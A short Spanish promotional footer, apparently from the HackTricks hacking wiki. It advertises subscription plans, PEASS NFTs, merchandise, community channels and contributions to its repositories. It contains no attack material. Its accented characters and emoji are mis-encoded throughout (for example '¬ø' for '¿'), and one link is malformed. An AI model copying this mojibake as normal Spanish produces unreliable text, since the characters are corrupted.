* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
